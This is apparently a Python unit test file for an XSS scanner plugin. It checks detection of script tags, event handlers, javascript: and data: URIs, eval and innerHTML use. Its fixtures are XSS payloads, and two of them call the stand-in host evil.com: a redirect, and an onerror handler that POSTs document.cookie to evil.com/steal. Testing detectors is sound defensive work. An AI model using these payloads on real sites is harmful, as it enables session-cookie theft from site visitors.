import unittest
from src.scanner.plugins.xss_scanner import XSSScanner


class TestXSSScanner(unittest.TestCase):
    """Test the XSS vulnerability scanner plugin."""

    def setUp(self):
        self.scanner = XSSScanner()

    def test_detect_inline_script_tags(self):
        """Test detection of inline script tags."""
        html = '''
        <html>
            <body>
                <script>alert('XSS')</script>
                <script src="external.js"></script>
            </body>
        </html>
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find inline script tags
        script_issues = [v for v in vulnerabilities if v.get("issue") == "inline_script_tag"]
        self.assertGreater(len(script_issues), 0)

    def test_detect_event_handlers(self):
        """Test detection of suspicious event handlers."""
        html = '''
        <button onclick="alert('XSS')">Click me</button>
        <div onmouseover="document.location='http://evil.com'"></div>
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find suspicious event handlers
        handler_issues = [v for v in vulnerabilities if v.get("issue") == "suspicious_event_handler"]
        self.assertGreater(len(handler_issues), 0)

    def test_detect_javascript_protocol(self):
        """Test detection of javascript: protocol handlers."""
        html = '''
        <a href="javascript:alert('XSS')">Link</a>
        <img src="javascript:void(0)" />
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find javascript: protocol issues
        js_protocol = [v for v in vulnerabilities if v.get("issue") == "javascript_protocol"]
        self.assertGreater(len(js_protocol), 0)

    def test_detect_eval_usage(self):
        """Test detection of eval() function."""
        html = '<script>eval(userInput);</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find eval usage
        eval_issues = [v for v in vulnerabilities if v.get("issue") == "eval_usage"]
        self.assertGreater(len(eval_issues), 0)

    def test_detect_innerhtml_assignment(self):
        """Test detection of innerHTML assignments."""
        html = '<script>document.getElementById("div").innerHTML = userInput;</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find innerHTML assignment
        html_issues = [v for v in vulnerabilities if v.get("issue") == "innerhtml_assignment"]
        self.assertGreater(len(html_issues), 0)

    def test_detect_unescaped_output(self):
        """Test detection of unescaped template variables."""
        html = '{{ userInput }} and ${ moreInput }'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find unescaped output
        unescaped = [v for v in vulnerabilities if v.get("issue") == "unescaped_output"]
        self.assertGreater(len(unescaped), 0)

    def test_detect_data_uri(self):
        """Test detection of data: URI handlers."""
        html = '''
        <img src="data:text/html,<script>alert('XSS')</script>" />
        <iframe src="data:text/html,<img src=x onerror=alert('XSS')>"></iframe>
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find data URIs
        data_uris = [v for v in vulnerabilities if v.get("issue") == "data_uri"]
        self.assertGreater(len(data_uris), 0)

    def test_detect_document_write(self):
        """Test detection of document.write() usage."""
        html = '<script>document.write("<img src=x onerror=alert(1)>")</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find document.write
        write_issues = [v for v in vulnerabilities if v.get("issue") == "document_write_usage"]
        self.assertGreater(len(write_issues), 0)

    def test_detect_function_constructor(self):
        """Test detection of new Function() constructor."""
        html = '<script>var fn = new Function("alert(1)");</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find Function constructor
        fn_issues = [v for v in vulnerabilities if v.get("issue") == "function_constructor"]
        self.assertGreater(len(fn_issues), 0)

    def test_detect_settimeout_eval(self):
        """Test detection of setTimeout with eval."""
        html = '<script>setTimeout("eval(userInput)", 1000);</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find setTimeout with eval
        timeout_issues = [v for v in vulnerabilities if v.get("issue") == "timeout_eval"]
        self.assertGreater(len(timeout_issues), 0)

    def test_safe_html_returns_no_issues(self):
        """Test that safe HTML returns minimal or no XSS issues."""
        html = '''
        <html>
            <head><title>Safe Page</title></head>
            <body>
                <h1>Hello World</h1>
                <p>This is a safe paragraph.</p>
                <a href="/safe-page">Safe Link</a>
            </body>
        </html>
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find very few or no XSS issues
        self.assertLess(len(vulnerabilities), 3)

    def test_severity_levels(self):
        """Test that findings have appropriate severity levels."""
        html = '<script>eval(userInput);</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Check that at least one finding has severity
        has_severity = any("severity" in v for v in vulnerabilities)
        self.assertTrue(has_severity)
        
        # eval should be critical
        eval_finding = next((v for v in vulnerabilities if v.get("issue") == "eval_usage"), None)
        if eval_finding:
            self.assertEqual(eval_finding.get("severity"), "critical")

    def test_empty_input(self):
        """Test handling of empty input."""
        result = self.scanner.scan(None)
        self.assertIn("vulnerabilities", result)
        self.assertEqual(len(result["vulnerabilities"]), 0)
        
        result = self.scanner.scan("")
        self.assertIn("vulnerabilities", result)
        self.assertEqual(len(result["vulnerabilities"]), 0)

    def test_complex_xss_payload(self):
        """Test detection of complex XSS payload."""
        html = '''
        <img src=x onerror="
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://evil.com/steal');
            xhr.send('data=' + document.cookie);
        " />
        '''
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # Should find the event handler at minimum
        self.assertGreater(len(vulnerabilities), 0)

    def test_finding_has_required_fields(self):
        """Test that findings have required fields."""
        html = '<script>alert(1)</script>'
        result = self.scanner.scan(html)
        vulnerabilities = result["vulnerabilities"]
        
        # All findings should have these fields
        for finding in vulnerabilities:
            self.assertIn("url", finding)
            self.assertIn("issue", finding)
            self.assertIn("severity", finding)


if __name__ == "__main__":
    unittest.main()
